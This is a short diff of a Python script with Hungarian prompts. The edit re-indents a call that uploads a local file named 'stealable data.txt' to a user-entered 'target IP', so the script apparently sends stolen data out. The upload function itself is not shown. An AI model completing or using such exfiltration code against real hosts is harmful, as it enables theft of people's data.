@@ -88,7 +88,7 @@ if x == 2:
     ip_cim = input("Add meg a célpont ip címét: ")
     fajl_nev = r"C:\Users\Hp\OneDrive\Asztali gép\ellopható adatok.txt"  
 
-fajl_feltoltes(ip_cim, fajl_nev)
+    fajl_feltoltes(ip_cim, fajl_nev)
 
 else:
     print("Fatal ERROR")    
